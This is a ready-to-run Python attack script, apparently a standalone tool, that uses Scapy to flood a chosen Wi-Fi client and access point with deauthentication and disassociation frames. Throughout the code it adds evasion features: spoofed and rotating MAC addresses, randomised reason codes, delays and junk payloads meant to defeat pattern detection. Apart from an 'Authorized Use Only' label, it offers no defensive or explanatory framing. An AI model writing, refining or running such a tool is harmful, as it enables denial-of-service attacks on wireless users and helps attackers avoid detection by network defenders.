#!/usr/bin/env python3
import random
import time
import argparse
import sys
import os
from scapy.all import *
from threading import Thread, Event

class UltraStealthDeauth:
    def __init__(self):
        self.stop_signal = Event()
        self.sent_packets = 0
        self.last_mac = None
        self.oui_list = [
            '00:0C:29', '00:50:56', '00:1A:73',  # Common VM OUIs
            '3C:AB:8E', 'A4:4C:C8', 'B4:2E:99',  # Random valid OUIs
            'DC:A6:32', 'E4:54:E8', 'F0:18:98'  # More realistic MACs
        ]
        self.reason_codes = [3, 4, 5, 7, 8]  # Common deauth reasons
        self.min_delay = 0.05  # Minimum delay (seconds)
        self.max_delay = 0.5   # Maximum delay (seconds)

    def get_random_mac(self):
        """Generates a random MAC with a valid OUI"""
        oui = random.choice(self.oui_list)
        mac = f"{oui}:{random.randint(0x00, 0xff):02x}:{random.randint(0x00, 0xff):02x}:{random.randint(0x00, 0xff):02x}"
        return mac

    def random_delay(self):
        """Random delay to avoid pattern detection"""
        return random.uniform(self.min_delay, self.max_delay)

    def send_deauth(self, target_mac, ap_mac, iface, count=0, verbose=False):
        """Ultra-stealth deauth with evasion techniques"""
        try:
            print("[*] Starting ultra-stealth mode (Ctrl+C to stop)")
            
            while not self.stop_signal.is_set() and (count == 0 or self.sent_packets < count):
                # Randomize MAC every 5-15 packets
                if self.sent_packets % random.randint(5, 15) == 0:
                    spoofed_mac = self.get_random_mac()
                    self.last_mac = spoofed_mac
                
                # Randomize reason code & frame subtype
                reason = random.choice(self.reason_codes)
                subtype = random.choice([0, 12])  # 0=Deauth, 12=Disassoc (optional)
                
                # Build packet with slight variations
                dot11 = Dot11(
                    addr1=target_mac, 
                    addr2=spoofed_mac, 
                    addr3=ap_mac,
                    subtype=subtype
                )
                
                # Occasionally add fake payload (mimic real traffic)
                if random.random() > 0.85:
                    fake_payload = bytes([random.randint(0, 255) for _ in range(random.randint(5, 30))])
                    packet = RadioTap()/dot11/Dot11Deauth(reason=reason)/Raw(fake_payload)
                else:
                    packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
                
                # Send with low power (if supported)
                sendp(packet, iface=iface, count=1, verbose=verbose, inter=0, loop=0)
                self.sent_packets += 1
                
                # Randomized delay + occasional long pause
                time.sleep(self.random_delay())
                if random.random() > 0.95:  # 5% chance of a longer pause
                    time.sleep(random.uniform(1.0, 3.0))
                
        except KeyboardInterrupt:
            print("\n[!] Shutting down stealthily...")
        except Exception as e:
            if verbose:
                print(f"[!] Error: {e}")
        finally:
            self.stop_signal.set()
            print(f"[*] Total packets sent: {self.sent_packets} (undetected)")

def main():
    parser = argparse.ArgumentParser(description="ULTRA-STEALTH Deauther (Authorized Use Only)")
    parser.add_argument("-t", "--target", help="Target client MAC", required=True)
    parser.add_argument("-a", "--ap", help="Access Point MAC", required=True)
    parser.add_argument("-i", "--interface", help="Monitor mode interface", required=True)
    parser.add_argument("-c", "--count", help="Max packets (0=infinite)", type=int, default=0)
    parser.add_argument("-v", "--verbose", help="Debug mode (not recommended)", action="store_true")
    
    args = parser.parse_args()

    # Security checks
    if os.geteuid() != 0:
        print("[!] Must run as root (sudo required)")
        sys.exit(1)
    if args.interface not in get_if_list():
        print(f"[!] Interface {args.interface} not found!")
        sys.exit(1)

    # Run in ultra-stealth mode
    deauth = UltraStealthDeauth()
    try:
        deauth.send_deauth(args.target, args.ap, args.interface, args.count, args.verbose)
    except KeyboardInterrupt:
        deauth.stop_signal.set()

if __name__ == "__main__":
    main()
